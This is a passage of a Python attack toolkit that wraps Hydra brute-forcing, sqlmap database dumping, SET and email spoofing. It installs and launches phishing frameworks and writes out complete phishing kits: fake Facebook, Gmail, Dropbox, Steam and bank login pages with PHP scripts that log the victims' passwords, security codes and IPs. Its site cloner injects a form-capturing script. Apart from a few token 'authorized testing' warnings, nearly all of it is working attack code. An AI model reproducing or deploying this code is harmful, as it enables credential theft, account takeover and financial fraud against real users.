    print("[!] Choose attack type:")
    print("1. Single user brute force")
    print("2. User list brute force")
    print("3. Password list brute force")
    print("4. Custom attack")
    
    choice = input("Select attack type (1-4, default 1): ").strip() or "1"
    
    if choice == "1":
        username = input("Username: ").strip()
        if not username:
            print("[-] Username required.")
            return
        user_list = username
        user_flag = "-l"
    elif choice == "2":
        user_list = input("User list file: ").strip()
        if not user_list or not os.path.exists(user_list):
            print("[-] User list file not found.")
            return
        user_flag = "-L"
    elif choice == "3":
        username = input("Username: ").strip()
        if not username:
            print("[-] Username required.")
            return
        user_list = username
        user_flag = "-l"
    elif choice == "4":
        username = input("Username or user list file: ").strip()
        if os.path.exists(username):
            user_list = username
            user_flag = "-L"
        else:
            user_list = username
            user_flag = "-l"
    else:
        print("[-] Invalid choice.")
        return
    
    service = input("Service (ssh,ftp,http-post-form,etc.): ").strip()
    if not service:
        print("[-] Service required.")
        return
    
    # Get password list
    wordlist = input("Password wordlist (default /usr/share/wordlists/rockyou.txt): ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        print("[!] Installing rockyou wordlist...")
        subprocess.run(["sudo", "apt", "install", "-y", "wordlists"])
        if not os.path.exists(wordlist):
            print("[-] Could not find wordlist.")
            return
    
    print(f"[+] Starting Hydra attack on {target}")
    print(f"[+] Service: {service}")
    print(f"[+] Wordlist: {wordlist}")
    
    cmd = ["hydra", user_flag, user_list, "-P", wordlist, target, service, "-t", "4"]
    
    try:
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        if proc.stdout is not None:
            for line in proc.stdout:
                print(line, end='')
        proc.wait()
        print("[+] Hydra attack completed.")
    except Exception as e:
        print(f"[-] Hydra failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def sqlmap_advanced_wrapper():
    print("[+] SQLMap Advanced Injection - Professional SQL injection testing")
    print("[!] This tool will test for SQL injection vulnerabilities.")
    
    url = input("Target URL (with parameter): ").strip()
    if not url:
        print("[-] URL required.")
        return
    
    if not '=' in url:
        print("[-] URL must contain a parameter (e.g., ?id=1)")
        return
    
    print("[!] Choose scan type:")
    print("1. Basic scan (batch mode)")
    print("2. Advanced scan (crawl, forms)")
    print("3. Custom scan")
    print("4. Database dump")
    
    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
    
    if choice == "1":
        options = "--batch --random-agent"
        print("[+] Basic scan with batch mode")
    elif choice == "2":
        options = "--batch --crawl=2 --forms --random-agent"
        print("[+] Advanced scan with crawling and forms")
    elif choice == "3":
        options = input("Custom SQLMap options: ").strip()
        if not options:
            options = "--batch --random-agent"
    elif choice == "4":
        options = "--batch --dump --random-agent"
        print("[+] Database dump mode")
    else:
        options = "--batch --random-agent"
    
    print(f"[+] Starting SQLMap scan on {url}")
    print(f"[+] Options: {options}")
    
    cmd = ["sqlmap", "-u", url] + options.split()
    
    try:
        print(f"[+] Running: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)
        proc.wait()
        print("[+] SQLMap scan completed.")
    except Exception as e:
        print(f"[-] SQLMap failed: {e}")
    
    input("\n[Press Enter to return to the menu]")

def setoolkit_advanced_wrapper():
    print("[+] Social Engineering Toolkit (SET) - Advanced social engineering")
    print("[!] WARNING: Use only for authorized, ethical testing.")
    print("[!] This tool requires root privileges.")
    
    if not check_root():
        print("[-] Root privileges required for SET.")
        return
    
    print("[!] SET will launch in a new terminal window.")
    print("[!] Follow the interactive menu in the SET terminal.")
    print("[!] Common SET modules:")
    print("  1. Spear-Phishing Attack Vectors")
    print("  2. Website Attack Vectors")
    print("  3. Infectious Media Generator")
    print("  4. Create a Payload and Listener")
    print("  5. Mass Mailer Attack")
    
    confirm = input("Launch SET? (y/N): ").strip().lower()
    if confirm == 'y':
        try:
            subprocess.run(["sudo", "setoolkit"])
        except Exception as e:
            print(f"[-] SET failed: {e}")
    else:
        print("[!] SET launch cancelled.")
    
    input("\n[Press Enter to return to the menu]")

def email_spoof_advanced_wrapper():
    print("[+] Advanced Email Spoofing - Professional email spoofing")
    print("[!] This is for testing email security only.")
    
    print("[!] Choose spoofing method:")
    print("1. Local sendmail test")
    print("2. SMTP relay test")
    print("3. Custom SMTP server")
    
    choice = input("Select method (1-3, default 1): ").strip() or "1"
    
    sender = input("From (fake email): ").strip()
    recipient = input("To (real email): ").strip()
    subject = input("Subject: ").strip()
    body = input("Message body: ").strip()
    
    if not all([sender, recipient, subject]):
        print("[-] All fields required.")
        return
    
    if choice == "1":
        print("[+] Using local sendmail")
        message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
        try:
            result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
            if result.returncode == 0:
                print("[+] Email sent via sendmail")
            else:
                print(f"[-] Sendmail failed: {result.stderr}")
        except Exception as e:
            print(f"[-] Sendmail error: {e}")
    
    elif choice == "2":
        print("[+] Using SMTP relay")
        smtp_server = input("SMTP server: ").strip() or "localhost"
        smtp_port = input("SMTP port: ").strip() or "25"
        
        try:
            import smtplib
            server = smtplib.SMTP(smtp_server, int(smtp_port))
            server.sendmail(sender, [recipient], f"Subject: {subject}\n\n{body}")
            server.quit()
            print("[+] Email sent via SMTP relay")
        except Exception as e:
            print(f"[-] SMTP error: {e}")
    
    elif choice == "3":
        print("[+] Custom SMTP server")
        smtp_server = input("SMTP server: ").strip()
        smtp_port = input("SMTP port: ").strip() or "587"
        username = input("Username (optional): ").strip()
        password = input("Password (optional): ").strip()
        
        try:
            import smtplib
            server = smtplib.SMTP(smtp_server, int(smtp_port))
            if username and password:
                server.starttls()
                server.login(username, password)
            server.sendmail(sender, [recipient], f"Subject: {subject}\n\n{body}")
            server.quit()
            print("[+] Email sent via custom SMTP")
        except Exception as e:
            print(f"[-] SMTP error: {e}")
    
    input("\n[Press Enter to return to the menu]")

def phishing_advanced_wrapper():
    print("[+] Advanced Phishing Toolkit - Professional phishing simulation")
    print("[!] WARNING: Use only for authorized security testing.")
    
    print("[!] Choose phishing framework:")
    print("1. BlackEye Phishing Framework")
    print("2. SocialFish Phishing Framework")
    print("3. HiddenEye Phishing Framework")
    print("4. Advanced Site Cloner")
    print("5. Custom Phishing Templates")
    print("6. Automated Phishing Campaign")
    print("7. Phishing Server Setup")
    
    choice = input("Select framework (1-7, default 1): ").strip() or "1"
    
    if choice == "1":
        blackeye_phishing()
    elif choice == "2":
        socialfish_phishing()
    elif choice == "3":
        hiddeneye_phishing()
    elif choice == "4":
        advanced_site_cloner()
    elif choice == "5":
        custom_phishing_templates()
    elif choice == "6":
        automated_phishing_campaign()
    elif choice == "7":
        phishing_server_setup()
    
    input("\n[Press Enter to return to the menu]")

def blackeye_phishing():
    print("[+] BlackEye Phishing Framework")
    print("[!] Installing and setting up BlackEye...")
    
    # Check if BlackEye is already installed
    blackeye_path = "/opt/BlackEye"
    if not os.path.exists(blackeye_path):
        print("[+] Installing BlackEye...")
        try:
            # Clone BlackEye repository
            subprocess.run(["sudo", "git", "clone", "https://github.com/thelinuxchoice/blackeye.git", blackeye_path])
            subprocess.run(["sudo", "chmod", "+x", f"{blackeye_path}/blackeye.sh"])
            print("[+] BlackEye installed successfully!")
        except Exception as e:
            print(f"[-] Failed to install BlackEye: {e}")
            return
    else:
        print("[+] BlackEye already installed.")
    
    print("[!] BlackEye provides 40+ phishing templates:")
    print("  - Social Media: Facebook, Instagram, Twitter, LinkedIn")
    print("  - Email Services: Gmail, Yahoo, Outlook")
    print("  - Gaming: Steam, Epic Games, Origin")
    print("  - Banking: PayPal, Stripe, Banking portals")
    print("  - Cloud Services: Dropbox, Google Drive, OneDrive")
    print("  - And many more...")
    
    print("\n[!] Launching BlackEye...")
    print("[!] In the BlackEye menu, you can:")
    print("  1. Choose from 40+ phishing templates")
    print("  2. Customize phishing pages")
    print("  3. Set up ngrok tunneling")
    print("  4. Monitor captured credentials")
    print("  5. Generate phishing links")
    
    try:
        subprocess.run(["sudo", "bash", f"{blackeye_path}/blackeye.sh"])
    except Exception as e:
        print(f"[-] Failed to launch BlackEye: {e}")

def socialfish_phishing():
    print("[+] SocialFish Phishing Framework")
    print("[!] Installing and setting up SocialFish...")
    
    socialfish_path = "/opt/SocialFish"
    if not os.path.exists(socialfish_path):
        print("[+] Installing SocialFish...")
        try:
            subprocess.run(["sudo", "git", "clone", "https://github.com/UndeadSec/SocialFish.git", socialfish_path])
            subprocess.run(["sudo", "chmod", "+x", f"{socialfish_path}/SocialFish.py"])
            print("[+] SocialFish installed successfully!")
        except Exception as e:
            print(f"[-] Failed to install SocialFish: {e}")
            return
    else:
        print("[+] SocialFish already installed.")
    
    print("[!] SocialFish features:")
    print("  - Advanced phishing templates")
    print("  - Custom domain support")
    print("  - Real-time credential capture")
    print("  - Multi-platform compatibility")
    
    try:
        subprocess.run(["sudo", "python3", f"{socialfish_path}/SocialFish.py"])
    except Exception as e:
        print(f"[-] Failed to launch SocialFish: {e}")

def hiddeneye_phishing():
    print("[+] HiddenEye Phishing Framework")
    print("[!] Installing and setting up HiddenEye...")
    
    hiddeneye_path = "/opt/HiddenEye"
    if not os.path.exists(hiddeneye_path):
        print("[+] Installing HiddenEye...")
        try:
            subprocess.run(["sudo", "git", "clone", "https://github.com/DarkSecDevelopers/HiddenEye.git", hiddeneye_path])
            subprocess.run(["sudo", "chmod", "+x", f"{hiddeneye_path}/HiddenEye.py"])
            print("[+] HiddenEye installed successfully!")
        except Exception as e:
            print(f"[-] Failed to install HiddenEye: {e}")
            return
    else:
        print("[+] HiddenEye already installed.")
    
    print("[!] HiddenEye features:")
    print("  - Advanced anti-detection")
    print("  - Custom phishing templates")
    print("  - Real-time monitoring")
    print("  - Multi-language support")
    
    try:
        subprocess.run(["sudo", "python3", f"{hiddeneye_path}/HiddenEye.py"])
    except Exception as e:
        print(f"[-] Failed to launch HiddenEye: {e}")

def advanced_site_cloner():
    print("[+] Advanced Site Cloner - Professional website cloning")
    
    url = input("Target website URL: ").strip()
    if not url:
        print("[-] URL required.")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    print("[!] Choose cloning method:")
    print("1. Basic clone (HTML only)")
    print("2. Advanced clone (HTML + CSS + JS)")
    print("3. Full clone (with resources)")
    print("4. Custom clone (selective)")
    
    method = input("Select method (1-4, default 2): ").strip() or "2"
    
    folder = f"phish_clone_{int(time.time())}"
    os.makedirs(folder, exist_ok=True)
    
    print(f"[+] Cloning {url} using method {method}...")
    
    try:
        import requests
        from bs4 import BeautifulSoup
        import urllib.parse
        
        # Get the main page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        if method == "1":
            # Basic clone - just HTML
            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
                f.write(response.text)
            print(f"[+] Basic clone saved to {folder}/index.html")
        
        elif method == "2":
            # Advanced clone - HTML + CSS + JS
            # Download CSS files
            css_files = []
            for link in soup.find_all('link', rel='stylesheet'):
                css_url = link.get('href')
                if css_url:
                    if css_url.startswith('//'):
                        css_url = 'https:' + css_url
                    elif css_url.startswith('/'):
                        css_url = urllib.parse.urljoin(url, css_url)
                    elif not css_url.startswith('http'):
                        css_url = urllib.parse.urljoin(url, css_url)
                    
                    try:
                        css_response = requests.get(css_url, headers=headers)
                        css_filename = f"style_{len(css_files)}.css"
                        with open(f"{folder}/{css_filename}", "w") as f:
                            f.write(css_response.text)
                        css_files.append(css_filename)
                        link['href'] = css_filename
                    except:
                        pass
            
            # Download JS files
            js_files = []
            for script in soup.find_all('script', src=True):
                js_url = script.get('src')
                if js_url:
                    if js_url.startswith('//'):
                        js_url = 'https:' + js_url
                    elif js_url.startswith('/'):
                        js_url = urllib.parse.urljoin(url, js_url)
                    elif not js_url.startswith('http'):
                        js_url = urllib.parse.urljoin(url, js_url)
                    
                    try:
                        js_response = requests.get(js_url, headers=headers)
                        js_filename = f"script_{len(js_files)}.js"
                        with open(f"{folder}/{js_filename}", "w") as f:
                            f.write(js_response.text)
                        js_files.append(js_filename)
                        script['src'] = js_filename
                    except:
                        pass
            
            # Save modified HTML
            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[+] Advanced clone saved to {folder}/")
            print(f"[+] Downloaded {len(css_files)} CSS files and {len(js_files)} JS files")
        
        elif method == "3":
            # Full clone - with all resources
            print("[+] Full cloning (this may take a while)...")
            
            # Create assets directory
            assets_dir = f"{folder}/assets"
            os.makedirs(assets_dir, exist_ok=True)
            
            # Initialize file counters
            css_files = []
            js_files = []
            img_files = []
            
            # Download images
            for img in soup.find_all('img'):
                img_url = img.get('src')
                if img_url:
                    if img_url.startswith('//'):
                        img_url = 'https:' + img_url
                    elif img_url.startswith('/'):
                        img_url = urllib.parse.urljoin(url, img_url)
                    elif not img_url.startswith('http'):
                        img_url = urllib.parse.urljoin(url, img_url)
                    
                    try:
                        img_response = requests.get(img_url, headers=headers)
                        img_filename = f"img_{len(img_files)}.{img_url.split('.')[-1] if '.' in img_url else 'jpg'}"
                        with open(f"{assets_dir}/{img_filename}", "wb") as f:
                            f.write(img_response.content)
                        img_files.append(img_filename)
                        img['src'] = f"assets/{img_filename}"
                    except:
                        pass
            
            # Download other resources (CSS, JS, etc.)
            for link in soup.find_all('link', rel='stylesheet'):
                css_url = link.get('href')
                if css_url:
                    if css_url.startswith('//'):
                        css_url = 'https:' + css_url
                    elif css_url.startswith('/'):
                        css_url = urllib.parse.urljoin(url, css_url)
                    elif not css_url.startswith('http'):
                        css_url = urllib.parse.urljoin(url, css_url)
                    
                    try:
                        css_response = requests.get(css_url, headers=headers)
                        css_filename = f"style_{len(css_files)}.css"
                        with open(f"{assets_dir}/{css_filename}", "w") as f:
                            f.write(css_response.text)
                        link['href'] = f"assets/{css_filename}"
                        css_files.append(css_filename)
                    except:
                        pass
            
            # Save modified HTML
            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
                f.write(str(soup))
            
            print(f"[+] Full clone saved to {folder}/")
            print(f"[+] Downloaded {len(img_files)} images and other resources")
        
        elif method == "4":
            # Custom clone - selective
            print("[+] Custom cloning options:")
            print("1. Clone only forms")
            print("2. Clone with custom modifications")
            print("3. Clone specific elements")
            
            custom_choice = input("Select custom option (1-3): ").strip()
            
            if custom_choice == "1":
                # Clone only forms
                forms = soup.find_all('form')
                if forms:
                    print(f"[+] Found {len(forms)} forms")
                    for i, form in enumerate(forms):
                        form_html = str(form)
                        with open(f"{folder}/form_{i}.html", "w", encoding='utf-8') as f:
                            f.write(form_html)
                    print(f"[+] Forms saved to {folder}/")
                else:
                    print("[-] No forms found on the page")
            
            elif custom_choice == "2":
                # Clone with custom modifications
                # Add phishing capture script
                capture_script = """
                <script>
                document.addEventListener('DOMContentLoaded', function() {
                    var forms = document.querySelectorAll('form');
                    forms.forEach(function(form) {
                        form.addEventListener('submit', function(e) {
                            e.preventDefault();
                            var formData = new FormData(form);
                            var data = {};
                            for (var pair of formData.entries()) {
                                data[pair[0]] = pair[1];
                            }
                            // Send to capture script
                            fetch('capture.php', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify(data)
                            });
                            // Continue with original form submission
                            form.submit();
                        });
                    });
                });
                </script>
                """
                
                # Insert capture script
                head = soup.find('head')
                if head:
                    script_tag = soup.new_tag('script')
                    script_tag.string = capture_script
                    head.append(script_tag)
                
                with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
                    f.write(str(soup))
                
                # Create capture script
                php_capture = """
                <?php
                $data = json_decode(file_get_contents('php://input'), true);
                if ($data) {
                    $log = "Time: " . date('Y-m-d H:i:s') . "\n";
                    $log .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
                    $log .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
                    $log .= "Data: " . json_encode($data) . "\n";
                    $log .= "---\n";
                    file_put_contents('captured.txt', $log, FILE_APPEND);
                }
                ?>
                """
                
                with open(f"{folder}/capture.php", "w") as f:
                    f.write(php_capture)
                
                print(f"[+] Custom clone with capture script saved to {folder}/")
        
        print(f"[+] Site cloning completed! Files saved to {folder}/")
        print(f"[+] To deploy: copy files to web server and access index.html")
        
    except Exception as e:
        print(f"[-] Cloning failed: {e}")

def custom_phishing_templates():
    print("[+] Custom Phishing Templates")
    
    print("[!] Choose template type:")
    print("1. Banking/Financial")
    print("2. Social Media")
    print("3. Email Services")
    print("4. Cloud Storage")
    print("5. Gaming Platforms")
    print("6. Corporate/Enterprise")
    print("7. Custom Template Builder")
    
    template_choice = input("Select template type (1-7): ").strip()
    
    if template_choice == "1":
        create_banking_template()
    elif template_choice == "2":
        create_social_media_template()
    elif template_choice == "3":
        create_email_template()
    elif template_choice == "4":
        create_cloud_template()
    elif template_choice == "5":
        create_gaming_template()
    elif template_choice == "6":
        create_corporate_template()
    elif template_choice == "7":
        custom_template_builder()

def automated_phishing_campaign():
    print("[+] Automated Phishing Campaign")
    print("[!] This will create a complete phishing campaign setup.")
    
    campaign_name = input("Campaign name: ").strip()
    if not campaign_name:
        campaign_name = f"campaign_{int(time.time())}"
    
    campaign_dir = f"phish_campaign_{campaign_name}"
    os.makedirs(campaign_dir, exist_ok=True)
    
    print("[!] Campaign components:")
    print("1. Phishing page")
    print("2. Email templates")
    print("3. Target list")
    print("4. Tracking system")
    print("5. Reporting dashboard")
    
    # Create campaign structure
    os.makedirs(f"{campaign_dir}/pages", exist_ok=True)
    os.makedirs(f"{campaign_dir}/emails", exist_ok=True)
    os.makedirs(f"{campaign_dir}/targets", exist_ok=True)
    os.makedirs(f"{campaign_dir}/logs", exist_ok=True)
    os.makedirs(f"{campaign_dir}/reports", exist_ok=True)
    
    print(f"[+] Campaign structure created: {campaign_dir}/")
    print("[+] Next steps:")
    print("  1. Create phishing pages in pages/")
    print("  2. Add email templates in emails/")
    print("  3. Add target list in targets/")
    print("  4. Deploy tracking system")
    print("  5. Monitor results in logs/")

def phishing_server_setup():
    print("[+] Phishing Server Setup")
    print("[!] Setting up professional phishing server...")
    
    print("[!] Choose server type:")
    print("1. Apache + PHP")
    print("2. Nginx + PHP")
    print("3. Python Flask")
    print("4. Node.js Express")
    print("5. Docker container")
    
    server_choice = input("Select server type (1-5): ").strip()
    
    if server_choice == "1":
        setup_apache_php_server()
    elif server_choice == "2":
        setup_nginx_php_server()
    elif server_choice == "3":
        setup_flask_server()
    elif server_choice == "4":
        setup_express_server()
    elif server_choice == "5":
        setup_docker_server()

# Helper functions for phishing templates
def create_banking_template():
    print("[+] Creating Banking/Financial Template")
    folder = "phish_banking"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Banking Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #2c3e50; margin: 0; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #3498db; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
            button:hover { background: #2980b9; }
            .security-notice { background: #e8f4fd; padding: 10px; border-radius: 4px; margin-top: 20px; font-size: 12px; color: #2c3e50; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h1>🏦 SecureBank</h1>
                <p>Secure Online Banking</p>
            </div>
            <form action="capture.php" method="post">
                <input type="text" name="account_number" placeholder="Account Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="text" name="security_code" placeholder="Security Code" required>
                <button type="submit">Secure Login</button>
            </form>
            <div class="security-notice">
                🔒 This is a secure connection. Your information is protected by SSL encryption.
            </div>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Account: " . $_POST['account_number'] . "\\n";
        $data .= "Password: " . $_POST['password'] . "\\n";
        $data .= "Security Code: " . $_POST['security_code'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://www.google.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Banking template created in {folder}/")

def create_social_media_template():
    print("[+] Creating Social Media Template")
    folder = "phish_social"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook - Log In or Sign Up</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #1877f2; margin: 0; font-size: 40px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #1877f2; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
            button:hover { background: #166fe5; }
            .forgot { text-align: center; margin-top: 20px; }
            .forgot a { color: #1877f2; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <form action="capture.php" method="post">
                <input type="email" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="forgot">
                <a href="#">Forgotten password?</a>
            </div>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Email: " . $_POST['email'] . "\\n";
        $data .= "Password: " . $_POST['password'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://www.facebook.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Social media template created in {folder}/")

def create_email_template():
    print("[+] Creating Email Services Template")
    folder = "phish_email"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Gmail - Sign in</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f1f3f4; margin: 0; padding: 20px; }
            .container { max-width: 450px; margin: 100px auto; background: white; padding: 48px 40px 36px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo img { width: 75px; height: 75px; }
            h1 { color: #202124; font-size: 24px; margin: 0 0 20px 0; text-align: center; }
            input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
            button { width: 100%; background: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 500; margin-top: 20px; }
            button:hover { background: #1557b0; }
            .forgot { text-align: center; margin-top: 20px; }
            .forgot a { color: #1a73e8; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iNzUiIHZpZXdCb3g9IjAgMCA3NSA3NSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTM3LjUgMUMxNy4yIDEgMSAxNy4yIDEgMzcuNUMxIDU3LjggMTcuMiA3NCAzNy41IDc0QzU3LjggNzQgNzQgNTcuOCA3NCAzNy41Qzc0IDE3LjIgNTcuOCAxIDM3LjUgMVoiIGZpbGw9IiM0Q0FGNTAiLz4KPHBhdGggZD0iTTI1IDI4LjVMMzcuNSAxNkw1MCAyOC41VjUwSDI1VjI4LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K" alt="Gmail">
            </div>
            <h1>Sign in</h1>
            <form action="capture.php" method="post">
                <input type="email" name="email" placeholder="Email or phone" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                <button type="submit">Next</button>
            </form>
            <div class="forgot">
                <a href="#">Forgot password?</a>
            </div>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Email: " . $_POST['email'] . "\\n";
        $data .= "Password: " . $_POST['password'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://accounts.google.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Email template created in {folder}/")

def create_cloud_template():
    print("[+] Creating Cloud Storage Template")
    folder = "phish_cloud"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dropbox - Sign in</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #0061fe; margin: 0; font-size: 32px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; background: #0061fe; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
            button:hover { background: #0051d4; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h1>Dropbox</h1>
            </div>
            <form action="capture.php" method="post">
                <input type="email" name="email" placeholder="Email address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Email: " . $_POST['email'] . "\\n";
        $data .= "Password: " . $_POST['password'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://www.dropbox.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Cloud storage template created in {folder}/")

def create_gaming_template():
    print("[+] Creating Gaming Platform Template")
    folder = "phish_gaming"
    os.makedirs(folder, exist_ok=True)
    
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Steam - Sign in</title>
        <style>
            body { font-family: Arial, sans-serif; background: #1b2838; margin: 0; padding: 20px; }
            .container { max-width: 400px; margin: 100px auto; background: #2a475e; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #66c0f4; margin: 0; font-size: 32px; }
            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #4a5c6b; border-radius: 4px; box-sizing: border-box; background: #1b2838; color: white; }
            button { width: 100%; background: #66c0f4; color: #1b2838; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
            button:hover { background: #4a9bc4; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <h1>Steam</h1>
            </div>
            <form action="capture.php" method="post">
                <input type="text" name="username" placeholder="Steam Account Name" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
        </div>
    </body>
    </html>
    """
    
    with open(f"{folder}/index.html", "w") as f:
        f.write(html)
    
    # Create capture script
    php_capture = """
    <?php
    if ($_POST) {
        $data = "Username: " . $_POST['username'] . "\\n";
        $data .= "Password: " . $_POST['password'] . "\\n";
        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
        $data .= "---\\n";
        file_put_contents('captured.txt', $data, FILE_APPEND);
    }
    header('Location: https://store.steampowered.com');
    ?>
    """
    
    with open(f"{folder}/capture.php", "w") as f:
        f.write(php_capture)
    
    print(f"[+] Gaming platform template created in {folder}/")

def create_corporate_template():
    print("[+] Creating Corporate/Enterprise Template")
